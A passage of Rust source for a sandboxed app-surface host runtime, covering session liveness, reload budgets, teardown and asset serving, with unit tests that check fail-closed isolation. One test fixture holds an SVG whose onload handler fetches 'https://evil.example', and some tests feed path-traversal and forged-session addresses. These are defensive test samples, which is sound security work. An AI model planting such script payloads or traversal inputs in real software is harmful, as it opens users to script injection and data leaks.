            return Err(AppScriptedSurfaceHostError::SessionGone);
        };
        if !self.session_is_live(&live, now) {
            return Err(AppScriptedSurfaceHostError::WatchdogTripped);
        }
        let payload_len = serde_json::to_vec(&message.payload)
            .map(|bytes| bytes.len() as u64)
            .unwrap_or(u64::MAX);
        if live.message_count >= self.watchdog.max_messages
            || live.payload_bytes.saturating_add(payload_len) > self.watchdog.max_payload_bytes
        {
            return Err(AppScriptedSurfaceHostError::WatchdogTripped);
        }
        let admitted = admit_bridge_message(
            &mut live.session,
            &projection,
            now,
            live_package_revision_ref,
            live_surface_revision,
            live_grant_revision,
            // A sandboxed iframe without allow-same-origin has an opaque
            // origin: `event.origin === "null"` on the web host; the iOS
            // synthetic scheme origin is admitted the same way through the
            // session binding, not through this string.
            "null",
            limits,
        );
        match admitted {
            Ok(()) => {
                live.message_count = live.message_count.saturating_add(1);
                live.payload_bytes = live.payload_bytes.saturating_add(payload_len);
                sessions.insert(message.session_ref.clone(), live);
                Ok(projection)
            },
            // A refused message (replay, sequence, origin, revision) kills
            // only itself, not the session: the session goes back in the
            // registry and stays bound to its budget.
            Err(error) => {
                sessions.insert(message.session_ref.clone(), live);
                Err(error.into())
            },
        }
    }

    /// TTL-only liveness of one registry entry at `now`: the session's
    /// window closes at `opened_at + session_ttl`. The message/payload and
    /// reload budgets stay admission concerns (`admit_bridge`,
    /// `note_reload`); this answers exactly the expiry question every
    /// serving and scope path must re-ask, because a registry entry is
    /// only evicted lazily on touch.
    fn session_is_live(&self, live: &ScriptedLiveSession, now: DateTime<Utc>) -> bool {
        now < live.opened_at + self.watchdog.session_ttl
    }

    /// Record one frame reload or renderer crash against the reload
    /// budget. The session is resolved through its installation binding —
    /// a reference is never trusted across installations, and a foreign
    /// pairing answers exactly like an unknown reference without touching
    /// the (possibly live) session of the other installation. A
    /// TTL-expired session is already gone: its entry is evicted and
    /// `SessionGone` answers. The budget-exceeded session is EVICTED from
    /// the registry for quarantine and the host must replace the frame
    /// with the closed failure notice.
    pub fn note_reload(
        &self,
        installation_id: &AppInstallationId,
        session_ref: &AppReference,
        now: DateTime<Utc>,
    ) -> Result<(), AppScriptedSurfaceHostError> {
        let mut sessions = self
            .sessions
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let Some(mut live) = sessions.remove(session_ref) else {
            return Err(AppScriptedSurfaceHostError::SessionGone);
        };
        if live.plan.installation_id != *installation_id {
            // The reference names nothing for this installation; the
            // session itself stays live for its own.
            sessions.insert(session_ref.clone(), live);
            return Err(AppScriptedSurfaceHostError::SessionGone);
        }
        if !self.session_is_live(&live, now) {
            return Err(AppScriptedSurfaceHostError::SessionGone);
        }
        live.reload_count = live.reload_count.saturating_add(1);
        if live.reload_count > self.watchdog.max_reloads {
            return Err(AppScriptedSurfaceHostError::ReloadBudgetExceeded);
        }
        sessions.insert(session_ref.clone(), live);
        Ok(())
    }

    /// Teardown with reason, mirroring the worker's kill semantics: the
    /// session is EVICTED from the registry — die first, every in-flight
    /// message and later asset request fails closed as `SessionGone`, and
    /// the map keeps no dead entries behind. The reason is kept in the
    /// signature (it drives the caller's lifecycle receipt semantics); the
    /// registry itself no longer parks it on a dead session. Returns the
    /// number of live sessions torn down.
    pub fn teardown_installation(
        &self,
        installation_id: &AppInstallationId,
        _reason: AppCustomSurfaceTeardown,
    ) -> usize {
        let mut sessions = self
            .sessions
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let before = sessions.len();
        sessions.retain(|_, live| live.plan.installation_id != *installation_id);
        before - sessions.len()
    }

    pub fn teardown_for_lifecycle_event(
        &self,
        installation_id: &AppInstallationId,
        kind: AppLifecycleEventKind,
    ) -> usize {
        let Some(reason) = teardown_reason_for_lifecycle(kind) else {
            return 0;
        };
        self.teardown_installation(installation_id, reason)
    }

    /// The requesting scope a live session was minted under — the asset
    /// route's session-bound fallback credential for hosted web behind
    /// Cloudflare Access, answering the workspace a credential-less
    /// frame request cannot assert. Fail-closed by construction: the
    /// registry holds only live sessions, and the TTL is enforced HERE —
    /// an expired session's entry is evicted by this touch and lends
    /// nothing — so an unknown, TTL-expired, budget-exceeded, or
    /// torn-down session has no scope to lend.
    pub fn session_scope(
        &self,
        session_ref: &AppReference,
        now: DateTime<Utc>,
    ) -> Option<AppScriptedSurfaceRequestScope> {
        let mut sessions = self
            .sessions
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        let Some(live) = sessions.get(session_ref) else {
            return None;
        };
        if !self.session_is_live(live, now) {
            sessions.remove(session_ref);
            return None;
        }
        Some(live.requesting_scope.clone())
    }

    pub fn session_live(&self, session_ref: &AppReference, now: DateTime<Utc>) -> bool {
        let mut sessions = self
            .sessions
            .lock()
            .unwrap_or_else(|error| error.into_inner());
        // Presence plus an unexpired TTL is liveness: an expired entry is
        // evicted by this touch, so the answer stays true to the
        // registry's only-live-sessions discipline.
        let expired = match sessions.get(session_ref) {
            Some(live) => !self.session_is_live(live, now),
            None => return false,
        };
        if expired {
            sessions.remove(session_ref);
            return false;
        }
        true
    }
}

/// Read the process-wide operator switch. Fail-closed: a missing,
/// unreadable, or disabled config admits nothing.
///
/// Deliberately a focused reader, not a full
/// `load_magician_config_from_path` call: the string-level YAML validation
/// plus one `serde_yaml::Value` read of `app_platform.custom_surfaces_v1`
/// is all this switch needs, and a full load would deserialize the entire
/// `MagicianConfig`, run the whole validation pipeline, and re-run its
/// process-global installs on every asset and bridge request. The API
/// handlers hold no config snapshot to read instead, and there is no
/// config-reload event to invalidate a cache against — a cached kill
/// switch that lagged the operator's flip would defeat its purpose — so
/// the switch is read fresh per request, just cheaply.
pub fn scripted_surfaces_enabled_in_config() -> bool {
    let path = magician::config::magician_config_path();
    let text = match std::fs::read_to_string(&path) {
        Ok(text) => text,
        Err(_) => return false,
    };
    // A config whose YAML the platform itself rejects must not admit
    // surfaces through a side door: refuse exactly what a full load would
    // refuse at this stage.
    if magician::config::validate_magician_config_yaml(&text).is_err() {
        return false;
    }
    let Ok(value) = serde_yaml::from_str::<serde_yaml::Value>(&text) else {
        return false;
    };
    value
        .get("app_platform")
        .and_then(|platform| platform.get("custom_surfaces_v1"))
        .and_then(|section| section.get("enabled"))
        .and_then(serde_yaml::Value::as_bool)
        .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use crate::apps::sandbox::GENERAL_IFRAME_SANDBOX;
    use chrono::TimeZone;

    use super::*;
    use crate::apps::{
        custom_surface_review::reviewed_custom_surface_request,
        manifest::{
            build_app_package_candidate, tests::valid_skill_document, AppBundleMember,
            AppPackageLimits,
        },
        models::{AppDataClassification, AppModelProcessing},
        records::{
            app_granted_authority_digest, AppBackgroundExecution, AppDataHandlingPolicy,
            AppExternalEgress, AppGrantRevision, AppMemoryPromotion, AppNetworkPolicy,
            AppPersonalAgentAccess, AppResourceCeiling,
        },
        surface_assets::{
            media_type_for_surface_path, resolve_surface_asset, AppSurfaceAssetMember,
        },
        surface_runtime::surface_admission_for_enabled_installation,
        update::{compute_permission_diff, AppPermissionChangeKind},
    };

    fn time(second: u32) -> DateTime<Utc> {
        Utc.with_ymd_and_hms(2026, 8, 27, 12, 0, second)
            .single()
            .unwrap()
    }

    fn reference(value: &str) -> AppReference {
        AppReference::parse(value).unwrap()
    }

    fn candidate() -> AppPackageCandidate {
        candidate_with_entry_document(b"<html><body>canvas</body></html>")
    }

    /// The same declared shape as [`candidate`] with different entry
    /// document bytes: a package update that changed the entry HTML after
    /// a session was minted — the sibling-resolution anchor drift case.
    fn candidate_with_entry_document(entry_html: &[u8]) -> AppPackageCandidate {
        let manifest = valid_skill_document()
            .replacen(
                "    app_sdk_version: \"1\"\n",
                "    app_sdk_version: \"1\"\n    required_features: [custom_surfaces_v1]\n",
                1,
            )
            .replacen(
                "app:\n",
                &format!(
                    "app:\n  permissions: [custom_surface]\n  custom_surface:\n    \
                     entry_points:\n{}",
                    "      - route: /canvas\n        document: surfaces/canvas.html\n"
                ),
                1,
            );
        build_app_package_candidate(
            vec![
                AppBundleMember::regular_file("SKILL.md", manifest.into_bytes()).unwrap(),
                AppBundleMember::regular_file("workflows/build.md", b"Build a plan.".to_vec())
                    .unwrap(),
                AppBundleMember::regular_file("assets/icon.svg", b"<svg/>".to_vec()).unwrap(),
                AppBundleMember::regular_file(
                    "vendor/skills/summarize/SKILL.md",
                    b"---\nname: summarize\nversion: 2.1.0\n---\n".to_vec(),
                )
                .unwrap(),
                AppBundleMember::regular_file(
                    "vendor/skills/summarize/bin/summarize.py",
                    b"print('summary')\n".to_vec(),
                )
                .unwrap(),
                AppBundleMember::regular_file("surfaces/canvas.html", entry_html.to_vec()).unwrap(),
                AppBundleMember::regular_file(
                    "surfaces/canvas.js",
                    b"console.log('canvas');".to_vec(),
                )
                .unwrap(),
                // Script-capable members that are NOT declared entry
                // documents: an SVG and an undeclared second HTML page.
                AppBundleMember::regular_file(
                    "surfaces/icon.svg",
                    b"<svg onload='fetch(\"https://evil.example\")'/>".to_vec(),
                )
                .unwrap(),
                AppBundleMember::regular_file(
                    "surfaces/other.html",
                    b"<html><body>undeclared page</body></html>".to_vec(),
                )
                .unwrap(),
            ],
            &AppPackageLimits::default(),
        )
        .expect("candidate")
    }

    /// Two declared entry points, so the grant matrix can distinguish
    /// "declared" from "granted": `/canvas` and `/board` are both declared,
    /// a grant may name either, neither, or both.
    fn two_entry_candidate() -> AppPackageCandidate {
        let entry_points = "      - route: /canvas\n        document: surfaces/canvas.html\n      \
                            - route: /board\n        document: surfaces/board.html\n";
        let manifest = valid_skill_document()
            .replacen(
                "    app_sdk_version: \"1\"\n",
                "    app_sdk_version: \"1\"\n    required_features: [custom_surfaces_v1]\n",
                1,
            )
            .replacen(
                "app:\n",
                &format!(
                    "app:\n  permissions: [custom_surface]\n  custom_surface:\n    \
                     entry_points:\n{entry_points}"
                ),
                1,
            );
        build_app_package_candidate(
            vec![
                AppBundleMember::regular_file("SKILL.md", manifest.into_bytes()).unwrap(),
                AppBundleMember::regular_file("workflows/build.md", b"Build a plan.".to_vec())
                    .unwrap(),
                AppBundleMember::regular_file("assets/icon.svg", b"<svg/>".to_vec()).unwrap(),
                AppBundleMember::regular_file(
                    "vendor/skills/summarize/SKILL.md",
                    b"---\nname: summarize\nversion: 2.1.0\n---\n".to_vec(),
                )
                .unwrap(),
                AppBundleMember::regular_file(
                    "vendor/skills/summarize/bin/summarize.py",
                    b"print('summary')\n".to_vec(),
                )
                .unwrap(),
                AppBundleMember::regular_file(
                    "surfaces/canvas.html",
                    b"<html><body>canvas</body></html>".to_vec(),
                )
                .unwrap(),
                AppBundleMember::regular_file(
                    "surfaces/canvas.js",
                    b"console.log('canvas');".to_vec(),
                )
                .unwrap(),
                AppBundleMember::regular_file(
                    "surfaces/board.html",
                    b"<html><body>board</body></html>".to_vec(),
                )
                .unwrap(),
            ],
            &AppPackageLimits::default(),
        )
        .expect("candidate")
    }

    fn admission<'a>(
        package: &'a AppReference,
        bundle: &'a AppDigest,
    ) -> AppSurfaceAssetAdmission<'a> {
        surface_admission_for_enabled_installation(
            package,
            bundle,
            AppInstallationId::parse("install_1").unwrap(),
            AppRevision::new(1).unwrap(),
            AppRevision::new(1).unwrap(),
            reference("host:session-1"),
            reference("bridge:session-scripted"),
            reference("nonce:1"),
            time(1),
        )
    }

    /// The requesting scope the API's host route binds at mint in tests
    /// (the principal/workspace its own `authenticated_app_scope`
    /// resolved).
    fn test_request_scope() -> AppScriptedSurfaceRequestScope {
        AppScriptedSurfaceRequestScope {
            principal: "owner@host.example".to_owned(),
            workspace: "workspace:default".to_owned(),
        }
    }

    fn host_plan_for(runtime: &AppScriptedSurfaceRuntime) -> AppScriptedSurfaceHostPlan {
        let package = candidate();
        let package_ref = reference("package-revision:reading-list");
        let bundle = package.bundle_digest().clone();
        let compiled = compile_scripted_surface_host_plan(
            &package,
            "/canvas",
            &all_granted(&package),
            admission(&package_ref, &bundle),
            "https://home.magicbeans.ai",
            true,
            time(1),
        )
        .expect("host plan");
        runtime
            .open_host(compiled, test_request_scope(), time(2))
            .expect("open")
    }

    /// Hydrate the exact reviewed `(route, document, digest)` grant set for
    /// every entry point a candidate declares — what an owner approving the
    /// full reviewed request persists on the grant revision.
    fn all_granted(
        package: &crate::apps::manifest::AppPackageCandidate,
    ) -> Vec<AppGrantedCustomSurfaceEntryPoint> {
        let request =
            reviewed_custom_surface_request(package.manifest().manifest(), package.members())
                .expect("hydrate")
                .expect("declared");
        request
            .entry_points
            .iter()
            .map(|entry| AppGrantedCustomSurfaceEntryPoint {
                route: entry.route.clone(),
                document: entry.document.clone(),
                document_digest: entry.document_digest.clone(),
            })
            .collect()
    }

    fn message(session_ref: &AppReference, request: &str) -> AppSurfaceV1BridgeMessage {
        AppSurfaceV1BridgeMessage {
            schema_version: SCRIPTED_SURFACE_BRIDGE_SCHEMA_VERSION,
            request_id: reference(request),
            sequence: 1,
            method: AppSurfaceV1Method::QueryData,
            origin: "null".to_owned(),
            session_ref: session_ref.clone(),
            nonce: reference("nonce:1"),
            installation_id: AppInstallationId::parse("install_1").unwrap(),
            package_revision_ref: reference("package-revision:reading-list"),
            surface_revision: AppRevision::new(1).unwrap(),
            grant_revision: AppRevision::new(1).unwrap(),
            view_or_action: None,
            payload: serde_json::json!({"select": ["title"]}),
        }
    }

    #[test]
    fn the_method_set_is_exactly_the_eight_supported_public_operations() {
        let mut operations = AppSurfaceV1Method::ALL
            .iter()
            .map(|method| method.operation_id())
            .collect::<Vec<_>>();
        operations.sort_by_key(|operation| operation.as_str());
        let mut inventory = magician_app_contract::SUPPORTED_PUBLIC_APP_OPERATIONS
            .iter()
            .map(|operation| operation.id)
            .collect::<Vec<_>>();
        inventory.sort_by_key(|operation| operation.as_str());
        assert_eq!(operations, inventory);
        assert_eq!(AppSurfaceV1Method::ALL.len(), 8);
        // Wire admission is closed: unknown methods do not decode.
        assert!(
            serde_json::from_value::<AppSurfaceV1Method>(serde_json::json!("subscribe")).is_err()
        );
        assert!(
            serde_json::from_value::<AppSurfaceV1Method>(serde_json::json!("wait_action_run"))
                .is_err()
        );
        assert!(
            serde_json::from_value::<AppSurfaceV1Method>(serde_json::json!("query_data_v2"))
                .is_err()
        );
    }

    #[test]
    fn host_plan_compiles_only_for_a_declared_entry_point_under_the_switch() {
        let package = candidate();
        let package_ref = reference("package-revision:reading-list");
        let bundle = package.bundle_digest().clone();
        let granted = all_granted(&package);
        // Operator switch off: nothing loads, the closed posture.
        assert_eq!(
            compile_scripted_surface_host_plan(
                &package,
                "/canvas",
                &granted,
                admission(&package_ref, &bundle),
                "https://home.magicbeans.ai",
                false,
                time(1),
            )
            .unwrap_err(),
            AppScriptedSurfaceHostError::CapabilityDisabled
        );
        // An undeclared route is refused even with the switch on.
        assert_eq!(
            compile_scripted_surface_host_plan(
                &package,
                "/other",
                &granted,
                admission(&package_ref, &bundle),
                "https://home.magicbeans.ai",
                true,
                time(1),
            )
            .unwrap_err(),
            AppScriptedSurfaceHostError::EntryPointNotDeclared
        );
        let compiled = compile_scripted_surface_host_plan(
            &package,
            "/canvas",
            &granted,
            admission(&package_ref, &bundle),
            "https://home.magicbeans.ai",
            true,
            time(1),
        )
        .expect("plan");
        assert_eq!(compiled.sandbox, "allow-scripts");
        assert!(!compiled.sandbox.contains("allow-same-origin"));
        assert_ne!(compiled.sandbox, GENERAL_IFRAME_SANDBOX);
        assert!(compiled.csp.contains("default-src 'none'"));
        assert!(compiled.csp.contains("script-src 'self'"));
        assert!(compiled.csp.contains("connect-src 'none'"));
        assert!(compiled
            .csp
            .contains("frame-ancestors https://home.magicbeans.ai"));
        assert_eq!(compiled.entry_document, "surfaces/canvas.html");
        assert!(compiled.entry_url.contains(&format!(
            "/custom-surface-v1/assets/{}/blake3:",
            compiled.session_ref.as_str()
        )));
        assert!(compiled.entry_url.contains("/surfaces/canvas.html"));
        assert_eq!(compiled.methods.len(), 8);
    }

    /// The entry address carries the live session reference as a path segment.
    /// Relative subresources retain that segment; a query credential would be
    /// dropped when `<script src="canvas.js">` resolves against the document.
    #[test]
    fn entry_url_carries_the_session_path_relative_assets_inherit() {
        let runtime = AppScriptedSurfaceRuntime::default();
        let plan = host_plan_for(&runtime);
        let prefix = format!("{SCRIPTED_SURFACE_ASSET_ROUTE_PREFIX}/");
        let tail = plan.entry_url.rsplit(prefix.as_str()).next().unwrap();
        let (session, digest, path_member) =
            parse_scripted_surface_session_asset_address(tail).expect("parse entry address");
        assert_eq!(session, plan.session_ref);
        assert_eq!(digest.as_str(), plan.entry_document_digest.as_str());
        assert_eq!(path_member, plan.entry_document);
        assert!(tail.ends_with(plan.entry_document.as_str()));
    }

    #[test]
    fn asset_credentials_bind_the_installation_path_and_live_session() {
        let runtime = AppScriptedSurfaceRuntime::default();
        let plan = host_plan_for(&runtime);
        let credential = runtime.asset_credential(&plan.entry_url, time(3)).unwrap();
        assert_eq!(credential.scope(), &test_request_scope());
        assert_eq!(credential.host_session_ref(), &plan.host_session_ref);
        let sibling = plan.entry_url.replace("canvas.html", "canvas.js");
        assert!(runtime.asset_credential(&sibling, time(3)).is_some());
        for invalid in [
            plan.entry_url.replace("/install_1/", "/install_other/"),
            plan.entry_url
                .replace(plan.session_ref.as_str(), "bridge:unknown"),
            plan.entry_url.replace("canvas.html", "../canvas.html"),
            plan.entry_url.replace("canvas.html", "%63anvas.html"),
            format!("{}?session=other", plan.entry_url),
            "/api/magician/v2/apps/installations/install_1/custom-surface-v1/host".to_owned(),
        ] {
            assert!(
                runtime.asset_credential(&invalid, time(3)).is_none(),
                "{invalid}"
            );
        }
        assert!(runtime
            .asset_credential(&plan.entry_url, plan.expires_at)
            .is_none());
        assert!(
            !runtime.session_live(&plan.session_ref, time(3)),
            "expiry evicts"
        );
    }

    #[test]
    fn asset_serving_refuses_changed_installation_or_revision_bindings() {
        let runtime = AppScriptedSurfaceRuntime::default();
        let plan = host_plan_for(&runtime);
        let package = candidate();
        let package_ref = reference("package-revision:reading-list");
        let bundle = package.bundle_digest().clone();
        for change in 0..5 {
            let mut request = admission(&package_ref, &bundle);
            match change {
                0 => request.installation_id = AppInstallationId::parse("install_other").unwrap(),
                1 => request.surface_revision = AppRevision::new(2).unwrap(),
                2 => request.grant_revision = AppRevision::new(2).unwrap(),
                3 => request.host_session_ref = reference("host:other"),
                _ => request.session_ref = reference("bridge:other"),
            }
            assert!(runtime
                .serve_asset(
                    &package,
                    &plan.session_ref,
                    plan.entry_document_digest.as_str(),
                    &plan.entry_document,
                    request,
                    time(3)
                )
                .is_err());
        }
    }

    #[test]
    fn digest_addressed_serving_verifies_bytes_against_the_address() {
        let runtime = AppScriptedSurfaceRuntime::default();
        let plan = host_plan_for(&runtime);
        let package = candidate();
        let package_ref = reference("package-revision:reading-list");
        let bundle = package.bundle_digest().clone();
        let prefix = format!("{SCRIPTED_SURFACE_ASSET_ROUTE_PREFIX}/");
        let tail = plan.entry_url.rsplit(prefix.as_str()).next().unwrap();
        let (_, digest, path) =
            parse_scripted_surface_session_asset_address(tail).expect("parse entry address");
        let (asset, cache) = runtime
            .serve_asset(
                &package,
                &plan.session_ref,
                &digest,
                &path,
                admission(&package_ref, &bundle),
                time(2),
            )
            .expect("serve entry document");
        assert_eq!(asset.path.as_str(), "surfaces/canvas.html");
        assert_eq!(cache, SCRIPTED_SURFACE_IMMUTABLE_CACHE_CONTROL);
        // A digest naming NEITHER the requested member NOR the session's
        // entry document fails closed: the address names nothing servable.
        // (Before the 1.6 kernel fix this was also the entry document's
        // answer for its own relative subresources — the multi-file
        // delivery gap; the sibling case is now admitted and pinned in
        // `session_scoped_siblings_resolve_under_the_entry_document_digest`.)
        let alien = AppDigest::blake3(b"alien").as_str().to_owned();
        assert_eq!(
            runtime
                .serve_asset(
                    &package,
                    &plan.session_ref,
                    &alien,
                    "surfaces/canvas.js",
                    admission(&package_ref, &bundle),
                    time(2),
                )
                .unwrap_err(),
            AppScriptedSurfaceHostError::DigestMismatch
        );
        // Hostile addresses fail closed.
        for hostile in [
            "not-a-digest/surfaces/canvas.html",
            "blake3:abc/surfaces/canvas.html",
            "blake3:0000000000000000000000000000000000000000000000000000000000000000/SKILL.md",
            "blake3:0000000000000000000000000000000000000000000000000000000000000000/surfaces/../\
             SKILL.md",
        ] {
            assert!(
                parse_scripted_surface_asset_address(hostile).is_err(),
                "{hostile}"
            );
        }
        assert_eq!(asset_cache_control(false), "private, no-store");
    }

    /// The 1.6 kernel fix for multi-file surfaces: a relative subresource
    /// of the entry document resolves under the entry's digest segment (a
    /// sandboxed frame cannot construct any other address), and the kernel
    /// serves that sibling from the same session-scoped package bundle
    /// with the sibling's own manifest-verified bytes — never trusting
    /// the URL segment for them.
    #[test]
    fn session_scoped_siblings_resolve_under_the_entry_document_digest() {
        let runtime = AppScriptedSurfaceRuntime::default();
        let plan = host_plan_for(&runtime);
        let package = candidate();
        let package_ref = reference("package-revision:reading-list");
        let bundle = package.bundle_digest().clone();
        let prefix = format!("{SCRIPTED_SURFACE_ASSET_ROUTE_PREFIX}/");
        let tail = plan.entry_url.rsplit(prefix.as_str()).next().unwrap();
        let (_, entry_digest, _) =
            parse_scripted_surface_session_asset_address(tail).expect("parse entry address");

        // The sibling script under the ENTRY document's digest — exactly
        // the request a relative `<script src="canvas.js">` produces —
        // serves its own verified bytes.
        let (sibling, cache) = runtime
            .serve_asset(
                &package,
                &plan.session_ref,
                &entry_digest,
                "surfaces/canvas.js",
                admission(&package_ref, &bundle),
                time(2),
            )
            .expect("sibling script serves under the entry digest");
        assert_eq!(sibling.path.as_str(), "surfaces/canvas.js");
        assert_eq!(sibling.bytes, b"console.log('canvas');");
        assert_eq!(sibling.media_type(), "text/javascript; charset=utf-8");
        assert_eq!(sibling.content_digest.as_str(), {
            let member = package
                .members()
                .iter()
                .find(|member| member.path().as_str() == "surfaces/canvas.js")
                .expect("script member");
            member.content_digest().as_str()
        });
        // The sibling carries the kernel serving posture: the same
        // scripted isolation (scripts on, network off) as the entry
        // document, and the kernel CSP the handler attaches to EVERY
        // served member regardless of media type (T12) is the same
        // deny-egress composition — a served sibling is never a bare
        // script response.
        assert!(sibling.isolation.allows_scripts);
        assert!(!sibling.isolation.allows_network);
        let csp = custom_surface_v1_csp("https://home.magicbeans.ai").expect("kernel csp");
        assert!(csp.contains("default-src 'none'"));
        assert!(csp.contains("script-src 'self'"));
        assert!(csp.contains("connect-src 'none'"));
        // T8: the address names the ENTRY document, not these bytes, so
        // the sibling answers `no-store` — immutable only under a digest
        // that names the served bytes themselves.
        assert_eq!(cache, SCRIPTED_SURFACE_NO_STORE_CACHE_CONTROL);

        // Direct per-member addressing is unchanged: the same member
        // under its OWN digest still serves, and immutably.
        let member_digest = {
            let member = package
                .members()
                .iter()
                .find(|member| member.path().as_str() == "surfaces/canvas.js")
                .expect("script member");
            member.content_digest().as_str().to_owned()
        };
        let (direct, direct_cache) = runtime
            .serve_asset(
                &package,
                &plan.session_ref,
                &member_digest,
                "surfaces/canvas.js",
                admission(&package_ref, &bundle),
                time(2),
            )
            .expect("direct digest addressing still serves");
        assert_eq!(direct.bytes, sibling.bytes);
        assert_eq!(direct_cache, SCRIPTED_SURFACE_IMMUTABLE_CACHE_CONTROL);

        // The sibling route stays ANCHORED to a still-live entry document:
        // a package update that changed the entry HTML leaves the session
        // holding an address whose anchor no longer hashes to it, and the
        // drifted entry document refuses its siblings exactly as it
        // refuses itself (direct addressing under the old digest is a
        // DigestMismatch too).
        let drifted = candidate_with_entry_document(b"<html><body>canvas v2</body></html>");
        let drifted_bundle = drifted.bundle_digest().clone();
        assert_eq!(
            runtime
                .serve_asset(
                    &drifted,
                    &plan.session_ref,
                    &entry_digest,
                    "surfaces/canvas.js",
                    admission(&package_ref, &drifted_bundle),
                    time(2),
                )
                .unwrap_err(),
            AppScriptedSurfaceHostError::DigestMismatch
        );

        // Session scoping is the authority, not the digest: an unknown
        // session never resolves siblings, and teardown of the live
        // session closes the sibling route exactly like the entry route.
        assert_eq!(
            runtime
                .serve_asset(
                    &package,
                    &reference("bridge:unknown"),
                    &entry_digest,
                    "surfaces/canvas.js",
                    admission(&package_ref, &bundle),
                    time(2),
                )
                .unwrap_err(),
            AppScriptedSurfaceHostError::SessionGone
        );
        runtime.teardown_for_lifecycle_event(
            &plan.installation_id,
            AppLifecycleEventKind::InstallationUpdated,
        );
        assert_eq!(
            runtime
                .serve_asset(
                    &package,
                    &plan.session_ref,
                    &entry_digest,
                    "surfaces/canvas.js",
                    admission(&package_ref, &bundle),
                    time(2),
                )
                .unwrap_err(),
            AppScriptedSurfaceHostError::SessionGone
        );
    }

    #[test]
    fn script_capable_documents_serve_only_as_declared_entry_points() {
        let runtime = AppScriptedSurfaceRuntime::default();
        let plan = host_plan_for(&runtime);
        let package = candidate();
        let package_ref = reference("package-revision:reading-list");
        let bundle = package.bundle_digest().clone();
        // A sandboxed frame that self-navigates to an undeclared SVG or
        // second HTML page must find nothing to land on: even with the
        // correct digest in the address, serving is refused. (T12: an SVG
        // served as image/svg+xml would execute its scripts.) Both address
        // forms are refused — the member's own digest (direct addressing)
        // AND the session's entry-document digest (the sibling form a
        // relative `<img src>`/navigation inside the entry document
        // naturally produces).
        let prefix = format!("{SCRIPTED_SURFACE_ASSET_ROUTE_PREFIX}/");
        let tail = plan.entry_url.rsplit(prefix.as_str()).next().unwrap();
        let (_, entry_digest, _) =
            parse_scripted_surface_session_asset_address(tail).expect("parse entry");
        for hostile in ["surfaces/icon.svg", "surfaces/other.html"] {
            let member = package
                .members()
                .iter()
                .find(|member| member.path().as_str() == hostile)
                .expect(hostile);
            for digest in [member.content_digest().as_str(), entry_digest.as_str()] {
                assert_eq!(
                    runtime
                        .serve_asset(
                            &package,
                            &plan.session_ref,
                            digest,
                            hostile,
                            admission(&package_ref, &bundle),
                            time(2),
                        )
                        .unwrap_err(),
                    AppSurfaceAssetError::ScriptCapableDocumentRefused.into(),
                    "{hostile} under {digest}"
                );
            }
        }
        // The resolver itself refuses script-capable NON-HTML members in
        // scripted mode without knowing the declaration: they can never be
        // a declared entry document (the manifest kernel requires `.html`).
        let svg =
            [
                AppSurfaceAssetMember::from_verified_bytes("surfaces/icon.svg", b"<svg/>".to_vec())
                    .unwrap(),
            ];
        assert_eq!(
            resolve_surface_asset(
                &svg,
                "surfaces/icon.svg",
                admission(&package_ref, &bundle),
                AppCustomSurfaceMode::ScriptedRequiresKillableBoundary,
                true,
            )
            .unwrap_err(),
            AppSurfaceAssetError::ScriptCapableDocumentRefused
        );
        // JavaScript members serve with a real JavaScript media type (never
        // opaque octet-stream), matched case-insensitively like every
        // executable predicate.
        assert_eq!(
            media_type_for_surface_path("surfaces/canvas.js"),
            "text/javascript; charset=utf-8"
        );
        assert_eq!(
            media_type_for_surface_path("surfaces/canvas.MJS"),
            "text/javascript; charset=utf-8"
        );
    }

    #[test]
    fn reopening_a_live_session_reference_is_refused_not_overwritten() {
        let runtime = AppScriptedSurfaceRuntime::default();
        let package = candidate();
        let package_ref = reference("package-revision:reading-list");
        let bundle = package.bundle_digest().clone();
        let compiled = compile_scripted_surface_host_plan(
            &package,
            "/canvas",
            &all_granted(&package),
            admission(&package_ref, &bundle),
            "https://home.magicbeans.ai",
            true,
            time(1),
        )
        .expect("plan");
        runtime
            .open_host(compiled.clone(), test_request_scope(), time(2))
            .expect("open");
        assert_eq!(
            runtime
                .open_host(compiled, test_request_scope(), time(2))
                .unwrap_err(),
            AppScriptedSurfaceHostError::SessionCollision
        );
        // The first session is untouched by the refused reopen: the minted
        // reference (`bridge:session-scripted` from the admission helper)
        // is still live.
        assert!(runtime.session_live(&reference("bridge:session-scripted"), time(2)));
    }

    /// The session-bound scope (the hosted-web CF Access posture):
    /// `open_host` stores the requesting scope the host route
    /// authenticated, the accessor lends it back only while the session
    /// is live, and the scope never leaves the server — the host plan a
    /// client parses carries no trace of it.
    #[test]
    fn open_host_binds_the_requesting_scope_to_the_live_session() {
        let runtime = AppScriptedSurfaceRuntime::default();
        // An unknown session reference has no scope to lend: the lookup is
        // fail-closed before anything else runs.
        assert_eq!(
            runtime.session_scope(&reference("bridge:unknown"), time(2)),
            None
        );
        let plan = host_plan_for(&runtime);
        assert_eq!(
            runtime.session_scope(&plan.session_ref, time(2)),
            Some(test_request_scope())
        );
        // Server-side only: the serialized host plan — the client's whole
        // contract surface — carries neither the bound principal nor the
        // workspace.
        let encoded = serde_json::to_string(&plan).expect("plan encodes");
        assert!(!encoded.contains(&test_request_scope().principal));
        assert!(!encoded.contains(&test_request_scope().workspace));
        // Teardown closes the scope with the session: a torn-down session
        // is absent from the registry, so it lends nothing.
        runtime.teardown_for_lifecycle_event(
            &plan.installation_id,
            AppLifecycleEventKind::InstallationUpdated,
        );
        assert_eq!(runtime.session_scope(&plan.session_ref, time(2)), None);
    }

    /// The binding is per session, not process-global: two sessions minted
    /// under two owners keep their own requesting scopes.
    #[test]
    fn each_session_carries_its_own_requesting_scope() {
        let runtime = AppScriptedSurfaceRuntime::default();
        let package = candidate();
        let package_ref = reference("package-revision:reading-list");
        let bundle = package.bundle_digest().clone();
        let granted = all_granted(&package);
        let compile = |session_ref: &str| {
            compile_scripted_surface_host_plan(
                &package,
                "/canvas",
                &granted,
                surface_admission_for_enabled_installation(
                    &package_ref,
                    &bundle,
                    AppInstallationId::parse("install_1").unwrap(),
                    AppRevision::new(1).unwrap(),
                    AppRevision::new(1).unwrap(),
                    reference("host:session-1"),
                    reference(session_ref),
                    reference("nonce:1"),
                    time(1),
                ),
                "https://home.magicbeans.ai",
                true,
                time(1),
            )
            .expect("plan")
        };
        let scope = |principal: &str, workspace: &str| AppScriptedSurfaceRequestScope {
            principal: principal.to_owned(),
            workspace: workspace.to_owned(),
        };
